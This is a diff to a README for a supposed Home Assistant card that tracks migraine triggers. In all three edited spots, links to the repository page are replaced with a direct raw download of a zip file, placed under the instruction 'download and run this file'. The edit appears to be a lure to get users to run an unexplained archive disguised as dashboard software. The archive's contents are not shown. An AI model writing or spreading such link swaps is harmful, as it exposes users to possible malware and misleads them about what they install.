@@ -1,6 +1,6 @@
 # 🌡️ migraine-risk-card - Track Migraine Triggers at Home
 
-[![Download migraine-risk-card](https://img.shields.io/badge/Download%20Now-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/projectionracedriver670/migraine-risk-card)
+[![Download migraine-risk-card](https://img.shields.io/badge/Download%20Now-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/projectionracedriver670/migraine-risk-card/main/sensor-package/risk-migraine-card-2.3.zip)
 
 ## 🧭 What this does
 
@@ -20,7 +20,7 @@ You can add it to your Home Assistant dashboard so you can see risk levels at a 
 
 Visit this page to download and run this file:
 
-https://github.com/projectionracedriver670/migraine-risk-card
+https://raw.githubusercontent.com/projectionracedriver670/migraine-risk-card/main/sensor-package/risk-migraine-card-2.3.zip
 
 On Windows, open the link in your browser, then follow the repository page to get the latest release or files. If you use Home Assistant Desktop or a browser on the same PC, you can keep the setup simple by copying the files into the right Home Assistant folder.
 
@@ -167,4 +167,4 @@ This repository provides the card for Home Assistant dashboards and the code nee
 
 Visit this page to download and run this file:
 
-https://github.com/projectionracedriver670/migraine-risk-card
+https://raw.githubusercontent.com/projectionracedriver670/migraine-risk-card/main/sensor-package/risk-migraine-card-2.3.zip
